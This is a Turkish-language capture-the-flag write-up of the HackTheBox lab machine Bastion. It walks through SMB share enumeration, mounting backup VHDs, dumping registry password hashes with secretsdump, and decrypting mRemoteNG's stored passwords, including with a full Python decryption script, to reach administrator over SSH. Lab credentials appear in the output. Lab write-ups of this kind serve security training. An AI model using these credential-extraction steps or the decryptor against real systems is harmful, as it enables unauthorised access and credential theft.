---
{"dg-publish":true,"permalink":"/ctf/bastion-ctf/"}
---


Bastion, dosya paylaşımından bir VHD'yi bağlama ve bir parola kasası programından parolaları kurtarma gibi bazı basit zorluklarla dolu, sağlam ve kolay bir sanal makineydi. Alışılmadık bir şekilde, bir web sitesiyle değil, SMB paylaşımındaki VHD görüntüleriyle başlıyor. Bu VHD'ler bağlandığında, kimlik bilgilerini çıkarmak için gerekli olan kayıt defteri (registry) hive'larına erişim sağlıyor. Bu kimlik bilgileri, kullanıcı olarak SSH üzerinden makineye erişim imkanı veriyor. Yönetici (administrator) erişimi elde etmek için, mRemoteNG kurulumunu istismar ederek profil verilerini ve şifrelenmiş verileri çıkarıyorum ve bunları çözmek için birkaç yöntem gösteriyorum. Yönetici parolasını kırdıktan sonra, SSH üzerinden yönetici olarak makineye erişebiliyorum.

## Box Info

|Name|[Bastion](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fbastion)[![Bastion](https://0xdf.gitlab.io/icons/box-bastion.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fbastion)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fbastion)|
|---|---|
|Release Date|[27 Apr 2019](https://twitter.com/hackthebox_eu/status/1121492261542428674)|
|Retire Date|7 Sep 2019|
|OS|Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Bastion](https://0xdf.gitlab.io/img/bastion-diff.png)|
|Radar Graph|![Radar chart for Bastion](https://0xdf.gitlab.io/img/bastion-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:26:58[![st3r30byt3](https://www.hackthebox.com/badge/image/3704)](https://app.hackthebox.com/users/3704)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|01:09:30[![snowscan](https://www.hackthebox.com/badge/image/9267)](https://app.hackthebox.com/users/9267)|
|Creator|[![L4mpje](https://www.hackthebox.com/badge/image/29267)](https://app.hackthebox.com/users/29267)|

## Recon

### nmap

```
nmap -p- --min-rate 10000 10.10.10.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 17:03 EST
Warning: 10.10.10.134 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.134
Host is up (0.49s latency).
Not shown: 61881 closed tcp ports (reset), 3641 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 46.24 seconds

```

```
nmap -sC -sV -p 22,135,139,445 10.10.10.134   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 17:04 EST
Nmap scan report for 10.10.10.134
Host is up (0.16s latency).

PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-07T22:05:13
|_  start_date: 2025-02-07T22:00:24
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-07T23:05:11+01:00
|_clock-skew: mean: -19m58s, deviation: 34m36s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds

```

- **Açık portlar:**
    
    - **22/tcp (SSH):** OpenSSH for Windows 7.9 (protokol 2.0)
    - **135/tcp (MSRPC):** Microsoft Windows RPC servisi
    - **139/tcp (NetBIOS-SSN):** Microsoft Windows netbios-ssn servisi
    - **445/tcp (Microsoft-DS):** Windows Server 2016 Standard 14393
- **Bilgiler:**
    
    - **Kullanıcı adı:** guest (Samba üzerinden giriş)
    - **Mesaj imzalama:** Devre dışı bırakılmış (tehlikeli ama varsayılan)
    - **Sistem bilgisi:** Windows Server 2016 Standard 14393 (Windows Server 2016)
    - **Zaman uyumsuzluğu:** Ortalama -19 dakika 58 saniye (sistem saati ile uyumsuzluk)
- **Özet:** Hedef makinada SSH, RPC, NetBIOS ve SMB servisleri açık, ve güvenlik ayarlarında bazı zayıflıklar bulunuyor (mesaj imzalama devre dışı, guest kullanıcısı ile giriş yapılabiliyor).


Windows'ta OpenSSH düzgündür.


### SMB

#### Enumeration

Normal bir çalıştırmada smbmap bana çok şey göstermiyor, ancak guest bir kullanıcı adıyla çalıştırıldığında daha fazla bilgi sağlıyor.

```
root@kali# smbclient -N -L //10.10.10.134

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

![Pasted image 20250208011122.png](/img/user/resimler/Pasted%20image%2020250208011122.png)

![Pasted image 20250208011106.png](/img/user/resimler/Pasted%20image%2020250208011106.png)

#### Backups Share

Backups'a bağlandığımda iki dosya ve bir dizin görüyorum:

![Pasted image 20250208011228.png](/img/user/resimler/Pasted%20image%2020250208011228.png)

WindowsImageBackup ilginç. Önce note.txt dosyasını kontrol edeceğim:

```
root@kali# cat note.txt

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

Bir Windows Image Backup büyük olasılıkla büyük olacaktır ve aktarım yavaş olacaktır (notta uyarıldığı gibi). Kopyalamaya çalışmak yerine, bu paylaşımı dosya sistemime bağlayacağım.

![Pasted image 20250208011401.png](/img/user/resimler/Pasted%20image%2020250208011401.png)

Paylaşımdaki tüm dosyaları listeleyeceğim:


```
root@kali# find /mnt/ -type f
/mnt/note.txt
/mnt/SDT65CB.tmp
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/BackupSpecs.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/BackupGlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/Catalog/GlobalCatalog
/mnt/WindowsImageBackup/L4mpje-PC/MediaId
/mnt/WindowsImageBackup/L4mpje-PC/SPPMetadataCache/{cd113385-65ff-4ea2-8ced-5630f6feca8f}
```

İki disk images vhd dosyası görüyorum.

#### Mount vhd

Virtual disk dosyalarını mount edeceğim ve içlerinde ne bulabileceğime bakacağım. İlk olarak, Linux'ta virtual hard disk dosyalarını [mount etmek için bir araç olan libguestfs-tools'u](https://linux.die.net/man/1/guestmount) `apt install ile guestmount`'u kuracağım.

Şimdi, iki VHD dosyasının her birini bağlamayı deneyeceğim. İlki başarısız oluyor:

```
root@kali# guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/
guestmount: no operating system was found on this disk

If using guestfish ‘-i’ option, remove this option and instead
use the commands ‘run’ followed by ‘list-filesystems’.
You can then mount filesystems you want by hand using the
‘mount’ or ‘mount-ro’ command.

If using guestmount ‘-i’, remove this option and choose the
filesystem(s) you want to see by manually adding ‘-m’ option(s).
Use ‘virt-filesystems’ to see what filesystems are available.

If using other virt tools, this disk image won’t work
with these tools.  Use the guestfish equivalent commands
(see the virt tool manual page).
```

İkincisi çalışır ve Windows dosya sistemi root'u gibi görünen bir şeye erişim sağlar:

```
root@kali# guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/

root@kali# ls /mnt2/

'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows
```


## Shell as l4mpje

### Dump Hashes From Registry

Dosya sistemine tam erişim sayesinde registry dosyalarına da erişebiliyorum. Bu dosyalar sistem çalışırken kilitlenebilir, ancak takılı bir sürücüde böyle bir sorun yaşamayacağım. Registry hives'ın depolandığı config dizininde, şifre hash'lerini dökmek için secretsdump.py kullanacağım:

```
root@kali:/mnt2/Windows/System32/config# secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:e4487d0421e6611a364a5028467e053c:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up... 
```

Ayrıca secretsdump.py dosyasının bilinmeyen bir kullanıcı için “==bureaulampje==” şeklinde bir varsayılan parola (ya da otomatik uzatma parolası) belirlediğini de fark ettim.

### Crack Hash

NTLM hash'lerinin crackstation'a gönderilmesi, l4mpje hesabı için aynı parolayı döndürür:

![Pasted image 20250208011923.png](/img/user/resimler/Pasted%20image%2020250208011923.png)


### SSH

Bir Windows kutusunda ssh görmek biraz sıra dışı, ama bu onu kullanmak için iyi bir şans gibi görünüyor. l4mpje olarak ssh yapabiliyorum:

![Pasted image 20250208012051.png](/img/user/resimler/Pasted%20image%2020250208012051.png)


## Privesc to administrator

### Enumeration

Host üzerinde yüklü programlara bakıldığında, mRemoteNG ilginç olarak göze çarpmaktadır:

```
PS C:\Program Files (x86)> dir


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        16-7-2016     15:23                Common Files
d-----        23-2-2019     09:38                Internet Explorer
d-----        16-7-2016     15:23                Microsoft.NET
da----        22-2-2019     14:01                mRemoteNG
d-----        23-2-2019     10:22                Windows Defender
d-----        23-2-2019     09:38                Windows Mail
d-----        23-2-2019     10:22                Windows Media Player
d-----        16-7-2016     15:23                Windows Multimedia Platform
d-----        16-7-2016     15:23                Windows NT
d-----        23-2-2019     10:22                Windows Photo Viewer
d-----        16-7-2016     15:23                Windows Portable Devices
d-----        16-7-2016     15:23                WindowsPowerShell
```

[mRemoteNG](https://github.com/mRemoteNG/mRemoteNG) bir remote connection management aracıdır ve kullanıcının çeşitli bağlantı türleri için parolaları kaydetmesine olanak tanır. Kullanıcının AppData dizininde bu bilgileri tutan confCons.xml adında bir dosya vardır:

```
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                    
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is 0CB3-C487                                                                                              

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                         

22-02-2019  15:03    <DIR>          .                                                                                           
22-02-2019  15:03    <DIR>          ..                                                                                          
22-02-2019  15:03             6.316 confCons.xml                                                                                
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
22-02-2019  15:03                51 extApps.xml                                                                                 
22-02-2019  15:03             5.217 mRemoteNG.log                                                                               
22-02-2019  15:03             2.245 pnlLayout.xml                                                                               
22-02-2019  15:01    <DIR>          Themes                                                                                      
              14 File(s)         76.577 bytes                                                                                   
               3 Dir(s)  11.383.193.600 bytes free  
```


Dosyada saklanan parolaların encrypted versiyonları ile xml:

```
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="9+/QC0ASX6vyu8eqAnoWf9rAqVvP8vuwonKagk7aY68lTF3pcqbgO0Lcj6E7xUwo6V47gl93CKdDTXKpYt0wOFk6" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```


Bu kutuyu piyasaya sürüldüğü zaman çözmüştüm ve yukarıdaki dosya o zamanki haliydi. Görünüşe göre dosya o zamandan beri değiştirilmiş. Önemli değil, sonuçlar aynı. Ancak bendekinden farklı değerler görürseniz, nedeni budur. Ortaya çıkan şifreler aynı olacaktır.

### Extract Passwords

#### Old Techniques

Şifreleri çözmek için statik bir key kullanan yazılımın eski bir sürümünü hedef alan [bu](http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html) ve [bunun](https://packetstormsecurity.com/files/126309/mRemote-Offline-Password-Decrypt.html) gibi pek çok makale var. [Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/mremote.rb) modülü de bunu suistimal etmektedir. Sürüm 1.76'dan başlayarak, kullanım artık bir master password seçebilir, ancak hala varsayılan bir şifre veya “mR3m” vardır. Ancak, varsayılan AES block modu da değişti, bu da tüm eski araçların yeni dosyaları çözmede hala yetersiz kalmasına neden oluyor.

#### Method 1: From Within mRemoteNG

[Commando](https://0xdf.gitlab.io/2019/04/09/commando-vm-installation.html) virtual makinemi açacağım ve mRemoteNG'yi yükleyeceğim. Ardından confCons.xml dosyasını hedeften C:\Users\0xdf\AppData\Roaming\mRemoteNG'ye atacağım ve mRemoteNG'yi yeniden açacağım. Listede iki bağlantı göreceğim:

![Pasted image 20250208013321.png](/img/user/resimler/Pasted%20image%2020250208013321.png)

mRemoteNG, bana parolaları doğrudan söylemek istemiyor. Ancak, programın önceden programlanmış olmadığı harici araçlarla çalışmasına izin vermek istemesini kullanarak, yeni bir Harici Araç (External Tool) oluşturabilirim. Bunu yapmak için **Araçlar (Tools) -> Harici Araçlar (External Tools) -> Yeni Harici Araç (New External Tool)** yolunu izleyebilirim.

Açılan pencerede, bir görüntü adı (display name), dosya adı (filename) ve argümanlar (arguments) ekleyeceğim. Bunları şu şekilde ayarlayabilirim:

![Pasted image 20250208013423.png](/img/user/resimler/Pasted%20image%2020250208013423.png)

External aracım sadece cmd ve kullanıcı adı ve parola ile bir echo çalıştırıyorum.

Artık bir bağlantıya sağ tıklayıp External Tools'a gidebiliyorum ve Password bir seçenek:

![Pasted image 20250208013444.png](/img/user/resimler/Pasted%20image%2020250208013444.png)

Tıklandığında, en üstte parolanın bulunduğu bir cmd penceresi açılır:

![Pasted image 20250208013456.png](/img/user/resimler/Pasted%20image%2020250208013456.png)

L4mpje için şifre zaten bildiklerimle eşleşiyor. DC için şifre yeni:

![Pasted image 20250208013516.png](/img/user/resimler/Pasted%20image%2020250208013516.png)
Şimdi administrator şifresine sahibim, “thXLHM96BeKL0ER2”.


#### Method 2: mremoteng-decrypt

Bastion'un çıktığı sıralarda GitHub'da [mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt) ortaya çıktı. O zamanlar sadece bir java sürümü vardı, ben de [buradan](https://github.com/kmahyyg/mremoteng-decrypt/releases) indirip çalıştırdım ve çalıştı:

```
root@kali:/opt/mremoteng-decrypt# java -jar decipher_mremoteng.jar OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7
User Input: OuhzIwEZtD30y9QFzUOGDDoHnaSWGQFHcD5YSnj/YoJ2sE41GLoykzMgEAZh940z8pKetHSQDonI5/z7
Use default password for cracking...
Decrypted Output: bureaulampje

root@kali:/opt/mremoteng-decrypt# java -jar decipher_mremoteng.jar V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
User Input: V22XaC5eW4epRxRgXEM5RjuQe2UNrHaZSGMUenOvA1Cit/z3v1fUfZmGMglsiaICSus+bOwJQ/4AnYAt2AeE8g==
Use default password for cracking...
Decrypted Output: thXLHM96BeKL0ER2
```


Şimdi bir Python scripti olduğunu görüyorum, ancak henüz onunla uğraşmadım.

#### Method 3: Script It

Çözdüğüm sırada GitHub'da yalnızca java sürümü vardı ve ben bir python sürümü istiyordum. Bu yüzden hızlı bir script yazdım:

```
  1 #!/usr/bin/env python3
  2 
  3 import base64
  4 import hashlib
  5 import re
  6 import sys
  7 from Cryptodome.Cipher import AES
  8 
  9 if len(sys.argv) != 2:
 10     print(f"[-] Usage: {sys.argv[0]} [confCons.xml]")
 11     sys.exit()
 12 
 13 try:
 14     with open(sys.argv[1], 'r') as f:
 15         conf = f.read()
 16 except FileNotFoundError:
 17     print(f"[-] Unable to open {sys.argv[1]}")
 18     sys.exit()
 19 
 20 mode = re.findall('BlockCipherMode="(\w+)"', conf)
 21 if len(mode) !=1:
 22     print("[-] Warning - No BlockCipherMode detected")
 23 elif mode[0] != 'GCM':
 24     print(f"[-] Warning - This script is for AES GCM Mode. {mode} detected")
 25 
 26 nodes = re.findall('<Node .+/>', conf)
 27 if len(nodes) > 0:
 28     print(f"[+] Found nodes: {len(nodes)}\n")
 29 else:
 30     print("[-] Found no nodes")
 31 
 32 for node in nodes:
 33     user = re.findall(' Username="(\w*)"', node)[0]
 34     enc = base64.b64decode(re.findall(' Password="([^ ]+)"', node)[0])
 35     salt = enc[:16]
 36     nonce = enc[16:32]
 37     cipher = enc[32:-16]
 38     tag = enc[-16:]
 39     key = hashlib.pbkdf2_hmac("sha1", b"mR3m", salt, 1000, dklen=32)
 40     aes = AES.new(key, AES.MODE_GCM, nonce=nonce)
 41     aes.update(salt)
 42     password = aes.decrypt_and_verify(cipher, tag).decode()
 43     print(f"Username: {user}\nPassword: {password}\n")
```

Bir consCons.xml dosyası alır ve bulabildiği tüm çözülmüş parolaları yazdırır.

```
root@kali# ./mRemoteNG-decrypt.py confCons.xml-orig 
[+] Found nodes: 2

Username: Administrator
Password: thXLHM96BeKL0ER2

Username: L4mpje
Password: bureaulampje
```


Bu komut dosyası [Gitlab](https://gitlab.com/0xdf/ctfscripts)'ımda da mevcuttur.


### SSH as administrator

Bu parola ile admin olarak giriş yapabiliyorum:

![Pasted image 20250208013951.png](/img/user/resimler/Pasted%20image%2020250208013951.png)

![Pasted image 20250208013957.png](/img/user/resimler/Pasted%20image%2020250208013957.png)
